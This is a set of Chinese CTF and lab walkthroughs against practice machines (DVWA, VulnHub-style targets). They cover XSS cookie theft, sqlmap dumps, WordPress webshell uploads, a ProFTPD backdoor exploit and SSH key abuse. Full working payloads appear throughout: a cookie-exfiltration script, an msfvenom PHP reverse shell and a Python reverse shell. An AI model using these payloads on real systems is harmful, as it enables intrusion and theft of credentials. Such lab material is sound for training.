1&lt;script&gt;document.body.innerHTML="&lt;div style=visibility:visible&gt;&lt;h1&gt;&lt;hr/&gt;THE WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;";&lt;/script&gt; url： 1http://192.168.43.117/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.body.innerHTML%3D%22%3Cdiv+style%3Dvisibility%3Avisible%3E%3Ch1%3E%3Chr%2F%3ETHE+WEBSITE+IS+UNDER+ATTACK%3C%2Fh1%3E%3C%2Fdiv%3E%22%3B%3C%2Fscript%3E# 如果js代码比较多，一般不会写在url中而是将js代码放在第三方服务器中，让用户访问时跳转到第三方获取js代码js代码其实也可以在攻击者的服务器中，但为了隐蔽性，会选择第三方服务器。例如攻击者将以下代码保存至hack.js文件中 12var img = new Image();img.src = "http://192.168.43.44:4444/cookies.php?cookie="+document.cookie; 该代码的作用是将cookie信息发送到攻击者服务器的4444端口开启apache服务利用代码： 1&lt;script src=http://192.168.43.44/hack.js&gt;&lt;/script&gt; 构造url： 1http://192.168.43.117/dvwa/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2F192.168.43.44%2Fhack.js%3E%3C%2Fscript%3E# 用户点击，会向指定站点服务器获取js脚本，浏览器解析后会把cookies发送给攻击者]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS跨站脚本攻击</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SQL注入（X-Forwarded-For注入）]]></title>
    <url>%2F2019%2F08%2F28%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SQL%E6%B3%A8%E5%85%A5%EF%BC%88X-Forwarded-For%E6%B3%A8%E5%85%A5%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Background SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 任何一个用户可以输入的位置都肯是注入点。比如url中，以及http报文中，头部参数； 简介X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。简单的来说，就是服务器端用来获取客户端真实IP的字段。 X-Forwarded-For格式 1X-Forwarded-For: client1, proxy1, proxy2 X-Forwarded-For包含多个IP地址，每个值通过逗号+空格分开，最左边（client1）是最原始客户端的IP地址，中间如果有多层代理，每一层代理会将连接它的客户端IP追加在X-Forwarded-For右边。 代理方向 1客户端=&gt;正向代理=&gt;透明代理=&gt;服务器反向代理=&gt;Web服务器 &emsp;&emsp;一般的客户端（例如浏览器）发送HTTP请求是没有X-Forwarded-For头的，当请求到达第一个代理服务器时，代理服务器会加上X-Forwarded-For请求头，并将值设为客户端的IP地址（也就是最左边第一个值），后面如果还有多个代理，会依次将IP追加到X-Forwarded-For头最右边，最终请求到达Web应用服务器，应用通过获取X-Forwarded-For头取左边第一个IP即为客户端真实IP。 X-Forwarded-For注入的实现原理：伪造X-Forwarded-For头部，头部内容包含恶意的sql语句 参考博客 X-Forwarded-For的一些理解 利用X-Forwarded-For伪造客户端IP漏洞成因及防范 利用X-Forwarded-For进行sql注入 实验环境 攻击机 Kali： 192.168.43.44 靶场机器 Debian： 192.168.43.93 信息探测探测靶机开放服务及其版本– nmap -sV 192.168.43.97 【开放80端口http服务】 【Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器】 浏览器访问站点页面 发现管理员登陆页面尝试弱口令登陆失败 漏洞扫描使用AWVS扫描站点漏洞（AWVS是一款专业的Web扫描工具）这里直接给出扫描结果发现站点存在sql注入漏洞,可注入的参数X-Forwarded-For 数据库爆破既然知道存在sql注入漏洞就可以用sql注入神器—-sqlmap先做一个简单的探测（-H +增加的头部 –batch 由系统默认参数） 1sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; --batch 果然存在漏洞那么就好办了跑数据库名 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; --dbs --batch 跑数据库表名 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog --tables --batch 跑列名 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog -T users --columns --batch 跑字段 1root@kali:~# sqlmap -u &quot;http://192.168.43.93&quot; -H &quot;x-forwarded-for:*&quot; -D photoblog -T users -C login,password --dump --batch 获得管理员账号，就可以登陆后台了]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SQL注入（POST参数注入）]]></title>
    <url>%2F2019%2F08%2F27%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SQL%E6%B3%A8%E5%85%A5%EF%BC%88POST%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Background SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 任何一个用户可以输入的位置都肯是注入点。比如url中，以及http报文中，POST传递的参数； 实验环境 攻击机 Kali：192.168.43.44 靶场机器 Ununtu 14.04 ： 192.168.43.97 目的：获得靶机root权限 信息探测探测靶机开放的服务– nmap -sV 192.168.43.97 发现靶机80、8080端口开放http服务 既然开放了http服务就试着浏览器访问一下或查看源代码80端口开放的web站点只有一张图片8080端口开口的web站点是一个购物站点 尝试扫描站点下的网页 1root@kali:~# nikto -host http://192.168.43.97 1root@kali:~# dirb http://192.168.43.97:8080 发现管理员登陆页面 漏洞扫描管理员界面尝试弱口令失败；扫一下有没有sql注入漏洞burpsuite抓包 sqlmap扫描 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 --dbs --batch 这里普通标准的扫描无法扫出sql漏洞，需要提高扫描等级（–level 5 –risk 3）数据库名已经跑出来这里发现8080端口站点使用的数据库wordpress8080所以这里选择这个数据库接下来就是跑出表名 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 -D wordpress8080 --tables --batch 跑列名 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 -D wordpress8080 -T users --columns --batch 跑字段 1root@kali:~# sqlmap -r test/post.txt --level 5 --risk 3 -D wordpress8080 -T users -C username,password --dump --batch 密码已经跑出来了 登陆管理员后台右键浏览器打开，输入账号密码，登陆后台 上传webshell需要一个webshell在/usr/share/webshells/php中选择php-reverse-shell.php 找到404页面（Appearance-&gt;Editor-&gt;404.php）替换成shell点击update file，提交 wordpress 上传点 theme 404.php执行：http://靶场IP/wordpress/wp-content/themes/主题名/404.php 浏览器打开网页，执行上传的shell 1http://192.168.43.97:8080/wordpress/wp-content/themes/twentythirteen/404.php kali 用nc监听4444端口– nc -vlp 4444 提升权限用python优化shell提权root权限，密码尝试空密码或SuperSecretPassword登陆成功，获得靶机root权限]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SQL注入（GET参数注入）]]></title>
    <url>%2F2019%2F08%2F25%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SQL%E6%B3%A8%E5%85%A5%EF%BC%88GET%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Background SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入的大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 SQL注入的产生原因通常表现在以下几个方面： 不当的类型处理； 不安全的数据库配置； 不合理的查询集处理； 不当的错误处理； 转义字符处理不合适； 多个提交处理不当； 实验环境攻击机： 192.168.43.44靶场机器： 192.168.43.201 信息探测扫描主机服务信息以及版本– nmap -sV 192.168.43.44 发现开放了ssh、http服务 探测敏感信息探测http服务隐藏的目录文件– nikto -host 192.168.43.201 发现一个管理员登陆页面这里可以尝试可不可以弱口令登陆，不过失败了 漏洞扫描 OWASP ZAP，全称：OWASP Zed Attack Proxy攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助我们在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。 用OWASP-ZAP对这个站点进行扫描输入url开始攻击，等待扫描完成发现一个get请求的url存在sql注入漏洞（存在漏洞参数：id） 数据库爆破知道存在sql注入漏洞，就用sqlmap来爆破站点的数据库爆数据库 1root@kali:~# sqlmap -u &quot;http://192.168.43.201/cat.php?id=1&quot; --dbs 发现两个数据库，一个是元数据库，那么另一个就是站点的数据库了接下来就是表名和列名了爆表名【categories|pictures|users】 1sqlmap -u &quot;http://192.168.43.201/cat.php?id=1&quot; -D photoblog --tables 爆列名【id|login|password】 1root@kali:~# sqlmap -u &quot;http://192.168.43.201/cat.php?id=1&quot; -D photoblog -T users --columns 爆字段内容 1root@kali:~# sqlmap -u &quot;http://192.168.43.201/cat.php?id=1&quot; -D photoblog -T users -C login,password --dump 获得管理员账号密码 账号：admin 密码：P4ssw0rd 上传webshell获取了管理员权限，尝试获取shell试着上传webshell有时候也可以通过sqlmap直接获取shell（数据库管理账号权限足够大） 1sqlmap -u &quot;http://192.168.43.201/cat.php?id=1&quot; --os-shell 发现一个上传点（虽然是图片，但是可能上传文件格式并没有做什么限制） 制作一个php语言的webshell将代码保存成一个Webshell.php文件点击上传发现上传失败，试着修改后缀为大写PHP(webshell.PHP) 上传成功 获取shell用msf工具监听获取返回的shell 12345msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; show options msf5 exploit(multi/handler) &gt; set LHOST 192.168.43.44 //默认端口4444msf5 exploit(multi/handler) &gt; run 访问刚刚上传的“图片”再回来看返回的shell 此时就获得了网站的shell；]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-Capture the flag]]></title>
    <url>%2F2019%2F08%2F23%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-Capture-the-flag%2F</url>
    <content type="text"><![CDATA[Background CTF（Capture The Flag）是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。 实验环境攻击机 kali： 192.168.0.106靶场机器 linux： 192.168.0.108 目的：获取靶机flag 信息探测 扫描主机开放的端口号 1nmap -p- -T4 靶场IP地址 快速扫描主机全部信息 1nmap -T4 -A -v 靶场IP地址 扫描常用服务开放了ftp、ssh、http服务扫描开放的端口 靶机开放端口【21(ftp)、22(ssh)、80(http)、9090(ze)、13337、22222、60000】 【注：EasyEngine是一个来自国外的建站环境一键安装脚本，支持一键部署NGINX、MySQL、Postfix、PHP 7建站环境和安装WordPress博客程序，而且还能智能化选择WordPress的缓存模式、自动部署Let’s Encrypt的SSL证书等等。】 端口分析 对于大端口非http服务，可以用nc来探测该端口的banner信息 1nc IP地址 端口号 对于大端口http服务，可以使用浏览器浏览界面、查看源代码，寻找flag值 1http://ip地址：端口号 根据扫描结果，发现两个大端口的未知的服务（13337、60000）可以用nc探测端口的banner信息探测13337端口 直接返回一个flag，这是就发现了第一个flagFLAG:{TheyFoundMyBackDoorMorty}-10Points 探测60000端口直接返回一个shell，在目录下发现flag文件第二个flagFLAG{Flip the pickle Morty!} - 10 Points 【banner信息：表示欢迎语，有时会含有敏感信息，比如系统版本信息等；banner 信息获取的基础是在和目标建立链接后的，只有建立的链接，才可以获取到相应的 banner 信息】 探测敏感信息12nikto -host http://靶场IP：端口dirb http://靶场IP：端口 80、9090端口是http服务，可通过先网页直接访问80端口网页和源代码没有发现可用信息9090端口网页发现第三个flagFLAG {There is no Zeus, in your face!} - 10 Points 因为靶机还开放了21端口ftp服务尝试网页浏览，看看是否能匿名登陆 1ftp://靶场IP 发现一个flag文件第四个flagFLAG{Whoa this is unexpected} - 10 Points 网页方式访问完，接下来对隐藏文件进行探测【password目录、robots文件等】 发现一个passwords目录，打开目录打开flag文件第五个flagFLAG{Yeah d- just don’t do it.} - 10 Points打开passwords.html发现一段英文，意思大概是密码在这个文件中，它被隐藏了查看源码发现一个密码：winter（后面可能会用到） 查看robots文件，访问文件中显示的文件发现一个用于IP tracer的cgi文件可能含有命令执行漏洞 果然不错，不过获得权限不大；因为之前得到了一个密码，所以可以查看有没有其他账号（/etc/passwd）这里用cat 命令好像被屏蔽了，可用用more 命令代替【三个账号名称：RickSanchez、Morty、Summer】从密码winter来看用户名应该就是Summer 登陆靶机登陆靶机一般用ssh进行登陆靶机不允许远程登陆想到之前扫描开放的端口22222尝试指定端口登陆登陆成功查看flag（使用cat命令就会显示一只猫）第六个flagFLAG{Get off the high road Summer!} - 10 Points 总结 注意未知服务的端口,可以使用nc获取对应的banner信息； 使用对应相近的shell命令来绕过限制； 如 cat more 对每一个服务都需要进行对应的探测，不放过任何一个可以利用的点；]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-FTP服务后门利用]]></title>
    <url>%2F2019%2F08%2F22%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Background 文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。FTP允许用户以文件操作的方式（如文件的增、删、改、查、传送等）与另一主机相互通信。然而， 用户并不真正登录到自己想要存取的计算机上面而成为完全用户， 可用FTP程序访问远程资源， 实现用户往返传输文件、目录管理以及访问电子邮件等等， 即使双方计算机可能配有不同的操作系统和文件存储方式。 FTP端口号是：21 默认情况下FTP协议使用TCP端口中的 20和21这两个端口，其中20用于传输数据，21用于传输控制信息。但有时数据端口不一定是20，这和FTP的应用模式有关，如果是主动模式，应该为20，如果为被动模式，由服务器端和客户端协商而定。 实验环境 攻击机 Kali： 192.168.0.106 靶机 Ubuntu： 192.168.0.105 目的： 获取靶机root权限 信息探测扫描主机服务信息以及服务版本 1nmap -sV 靶场IP地址 快速扫描主机全部信息 1nmap -T4 -A -v 靶场IP 发现靶机开放了ftp服务，并且有相应的版本信息。（ProFTPD:一个Unix平台上或是类Unix平台上（如Linux, FreeBSD等）的FTP服务器程序。） 发现漏洞 分析nmap扫描结果，挖掘可以利用的信息； 使用seachsploit，查看漏洞信息，找到可利用的溢出代码；1root@kali:~# searchsploit ProFTPD 1.3.3c 发现ProFTPD 1.3.3c存在漏洞，并且在msf中集成了可用的EXP; msf利用漏洞123456789msf5 &gt; search ProFTPD 1.3.3c //搜索可用的模块msf5 &gt; use exploit/unix/ftp/proftpd_133c_backdoor // 使用模块msf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads // 显示可用的payloadmsf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; set payload cmd/unix/reverse // 设置payloadmsf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options // 查看配置项msf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; set rhosts 192.168.0.105 // 设置靶机IPmsf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; set lhost 192.168.0.106 // 设置攻击者IPmsf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options // 确认配置项msf5 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit // 发送利用代码 查询是否有可利用的模块 使用模块，并查询可用的payload 设置payload（cmd/unix/reverse），查看需要填写的配置项 设置IP地址 发送利用代码 因为交互的方式对用户不是很友好，可用python进行优化输入以下命令 1python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot; 总结 对于开放FTP、SSH、Telnet等服务的系统，可以尝试一些对应服务版本的漏洞利用代码； 对于系统，一定要注意利用现成的EXP来root主机；]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SMB服务信息泄露]]></title>
    <url>%2F2019%2F08%2F19%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SMB%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%2F</url>
    <content type="text"><![CDATA[Background SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。 后来Linux移植了SMB，并称为samba。SMB用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居J就是由它实现。SMB协议是基于TCP－NETBIOS下的，一般端口使用为139，445。 实验环境 攻击机：Kali - 192.168.0.105 靶场机器： linux - 192.168.0.106 目的： 获取靶机flag 信息探测对于只是给定一个IP地址的靶场机器，我们需要用对其进行扫描，探测开放的服务。渗透其实是针对服务的漏洞探测，然后进行对应的数据包发送，获取机器的最高权限。 nmap -SV IP 挖掘开放服务信息 nmap -A -v -T4 IP 挖掘靶场全部信息 靶机开口的服务【22（ssh）、80（http）、139，445（smb）、3306（mysql）等】 SMB协议弱点分析 针对SMB协议，使用空口令尝试登陆，并查看敏感文件，下载查看 123smbclient -L IP //列出某个IP地址所提供的共享文件夹smbclinet &apos;\\IP\$share&apos;get 敏感文件 针对SMB协议远程溢出漏洞进行分析。 1searchsploit samba版本号 查看靶机的共享文件发现share文件可以访问通过get 下载敏感文件文件钟有一个密码12345发现配置文件配置文件中有mysql账户名密码（Admin、TogieMYSQL12345^^）；尝试登陆mysql 登陆失败，服务器端不接受远程登陆尝试ssh登陆，登陆失败注：WordPress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。 http协议弱点分析 浏览器查看网址 使用dirb或nikto探测 寻找突破的目标，登陆后台，上传webshell dirb扫描目录发现wordpress后台管理页面登陆之前的账号密码（Admin、TogieMYSQL12345^^）成功登陆后台我们可以上传一个webshell来达到控制机器的目的 制作webshell因为后台是php编写的，所以我们上传一个php的shell 1root@kali:~/test# msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.105 lport=4444 -f raw 1&lt;?php /**/ error_reporting(0); $ip = '192.168.0.105'; $port = 4444; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) &#123; $s = $f("tcp://&#123;$ip&#125;:&#123;$port&#125;"); $s_type = 'stream'; &#125; if (!$s &amp;&amp; ($f = 'fsockopen') &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = 'stream'; &#125; if (!$s &amp;&amp; ($f = 'socket_create') &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = 'socket'; &#125; if (!$s_type) &#123; die('no socket funcs'); &#125; if (!$s) &#123; die('no socket'); &#125; switch ($s_type) &#123; case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') &amp;&amp; ini_get('suhosin.executor.disable_eval')) &#123; $suhosin_bypass=create_function('', $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die(); 上传webshell使用找到的明信息登陆系统后台，上传webshell，执行webshell（访问具有webshell的php页面） 获得反弹的shell wordpress 上传点 theme 404.php执行：http://靶场IP/wordpress/wp-content/themes/twentyfifteen/404.php 找到404页面（Appearance-&gt;Editor-&gt;404.php）替换源代码 用msf打开监听端口 12345msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost=192.168.0.105msf5 exploit(multi/handler) &gt; show options msf5 exploit(multi/handler) &gt; run 浏览器打开404网页 执行webshell 1http://192.168.0.106/wordpress/wp-content/themes/twentyfifteen/404.php 接受到一个shell 优化shell 查看所有用户 发现一个用户togie切换用户，尝试密码12345 sudo切换为root用户，查看flag 12345678910111213141516171819202122232425262728togie@LazySysAdmin:/var/www/html/wordpress/wp-content/themes$ sudo -ssudo -sroot@LazySysAdmin:/var/www/html/wordpress/wp-content/themes# ls /rootls /rootproof.txtroot@LazySysAdmin:/var/www/html/wordpress/wp-content/themes# cat /root/proof.txt&lt;html/wordpress/wp-content/themes# cat /root/proof.txt WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851Well done :)Hope you learn&apos;t a few things along the way.Regards,Togie McdogieEnjoy some random stringsWX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT98512d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19puroot@LazySysAdmin:/var/www/html/wordpress/wp-content/themes# 总结 对于开放139和445端口的机器移动要注意是否可以直接使用smbclient登陆到共享目录查找敏感文件； 一般情况下flag值都在/root目录下，并且都在/root目录下，并且需要提升root权限才能查看；]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SSH服务渗透]]></title>
    <url>%2F2019%2F08%2F13%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SSH%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[Background SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。 SSH是一般是基于TCP 22号端口的服务 SSH协议认证机制 基于口令的安全验证 &emsp;&emsp;只要你知道自己帐号和口令，就可以登录到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想连接的服务器。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人”这种方式的攻击。 基于密匙的安全验证 &emsp;&emsp;需要依靠密匙，也就是你必须为自己创建一对密匙，并把公用密匙放在需要访问的服务器上。如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的密匙进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用密匙，然后把它和你发送过来的公用密匙进行比较。如果两个密匙一致，服务器就用公用密匙加密“质询”（challenge）并把它发送给客户端软件。客户端软件收到“质询”之后就可以用你的私人密匙解密再把它发送给服务器。 用这种方式，你必须知道自己密匙的口令。但是，与第一种级别相比，第二种级别不需要在网络上传送口令。 一般id_rsa为私钥，id_rsa.pub为公钥； 认证机制弱点 基于口令的安全验证 &emsp;&emsp;基于字典的暴力破解，破解对应用户名和密码，通过SSH客户端连接到远程主机的SSH服务，实现对服务器的控制。（不一定是root权限） 基于密匙的安全验证 &emsp;&emsp;通过对主机的信息收集获取到泄露的用户名和对应的密钥。 chmod 600 id_rsa ssh -i id_rsa 用户名@主机地址 登陆服务器。（不一定是root权限） 实验环境攻击机：Kali - 192.168.0.105靶场机器： linux - 192.168.0.107 目的： 获取靶机root权限 信息探测对于给定IP地址的靶场机器，对其进行渗透测试，首先需要考虑靶场机器开放的服务。 探测靶场开放的服务与服务的版本 – nmap -sV 靶场IP地址 探测靶场的全部信息 – nmap -A -v 靶场IP地址 探测靶场的操作系统类型与版本 – nmap -O 靶场IP地址 发现目标靶机开放了http、ssh服务对于ssh服务的22端口，首先考虑 1.暴力破解 2.私钥泄露（私钥有没有对应的密码、是否可以找到私钥的用户名） 对于http服务的80端口或其他端口 通过浏览器访问对应的http服务，如http://ip:port 使用工具对目录进行探测，如dirb http://ip:port/注意特殊的端口（大于1024） 挖掘敏感信息 使用浏览器对靶场IP的http服务进行探测，对于页面展示的内容也要注意，尤其是联系人等信息（可能就是用户名）,递归访问，争取遍历到每一个目录 尤其对robots.txt、以及一些目录的访问，挖掘具备利用价值的信息，对于开放ssh服务的靶机，要注意是否泄露了私钥（id_rsa） 发现了一些联系人的信息（Martin、Hadi、Jimmy） 对目录进行探测发现了很多文件，通过网页进行访问发现了私钥信息 对于某些靶场，也可以通过nikto扫描器来挖掘敏感信息– nikto -host 靶场IP 特别注意config等特殊敏感文件 利用敏感、弱点信息对挖掘到的ssh密钥利用 修改id_rsa的权限 chmod 600 id_rsa 利用私钥登陆服务器 ssh -i id_rsa 用户名@靶场IP地址 注意：如果id_rsa没有解密密码，可以直接使用。但是如果id_rsa有解密密码那么需要进行对应的破解 可以用wget将文件下载下来 1root@kali:~/test# wget http://192.168.0.107/icons/VDSoyuAXiO.txt 修改文件名并赋予相应权限 连接到靶机服务器（这里尝试使用联系人作为用户名） 1root@kali:~/test# ssh -i id_rsa martin@192.168.0.107 扩大战果登陆服务器之后，我们可以做以下操作 查看当前用户 whoami id 查看当前用户权限 查看 根目录 寻找flag文件 如果是root权限，那么表明这个靶场就被全部拿下。但是如果不是，就肯定需要提权。一般情况，flag文件只属于root用户和对应的用户组 1234cat /etc/passwd 查看所有用户的列表cat /etc/group 查看用户组find / -user 用户名 查看属于某些用户的文件/tmp 查看缓冲文件目录 我们可以通过以上命令，尝试获取一些有用的信息 深入挖掘通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以有不同的定时任务 cat /etc/crontab 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对应靶场机器的某个文件。 如果在/etc/crontab下有某个用户的定时计划文件，但是具体目录下没有这个定时的执行文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。 如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否具有读写权限。 参考博客 Linux定时任务Crontab命令详解 /etc/crontab文件和crontab -e命令区别查看定时执行文件，发现jimmy用户每5分钟会执行一次python脚本但是在tmp目录下除一些隐藏文件外，并没有任何脚本123456789martin@debian:/tmp$ ls -altotal 28drwxrwxrwt 7 root root 4096 août 16 13:05 .drwxr-xr-x 21 root root 4096 avril 26 2017 ..drwxrwxrwt 2 root root 4096 août 16 12:09 .font-unixdrwxrwxrwt 2 root root 4096 août 16 12:09 .ICE-unixdrwxrwxrwt 2 root root 4096 août 16 12:09 .Test-unixdrwxrwxrwt 2 root root 4096 août 16 12:09 .X11-unixdrwxrwxrwt 2 root root 4096 août 16 12:09 .XIM-unix 所以我们可以自行编写，再让它执行 反弹shell靶场代码 123456789#!/usr/bin/pythonimport os,subprocess,sockets = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect(("192.168.0.105",4444))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p = subprocess.call(["/bin/sh","-i"]) 攻击机netcat命令– nc -lvp 为占用端口 1查看占用端口 netstat -pantu 可以通过netcat将脚本发到靶机 netcat传输文件用法 先在本地启动发送命令（直接发送给靶机会被防火墙，所以在本地开放端口，让靶机主动连接即可） 1root@kali:~/test# nc -l 4445 &lt;1.py //从本地打开4445端口发送文件，等待连接 靶机连接，下载文件 12345678910111213141516martin@debian:/tmp$ nc 192.168.0.105 4445 &gt;1.py //连接kali，下载文件martin@debian:/tmp$ martin@debian:/tmp$ ls1.pymartin@debian:/tmp$ cat 1.py #!/usr/bin/pythonimport os,subprocess,sockets = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;192.168.0.105&quot;,4444))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p = subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])martin@debian:/tmp$ 然后kali监听4444端口将1.py重命名为sekurity.py,并添加可执行权限等待一段时间~ 发现jimmy连接了我们的shell，但是很可惜jimmy也不是root权限，所以只能从最后一个用户Hadi入手 暴力破解万不得已的时候 只能对ssh服务进行暴力破解。破解最后一个用户名。破解工具如hydra、medusa等。 这里我们用cupp生成字典，再使用metasploit破解ssh cupp是生成的是社工字典，跟据输入的信息生成密码，（回车跳过输入） 1root@kali:~/test# cupp3 -i //-i 交互模式 打开msf渗透测试框架 1root@kali:~/test# msfconsole 这里要用到ssh_login模块，可以用search搜索 1msf5 &gt; search ssh_login use使用模块 1msf5 &gt; use 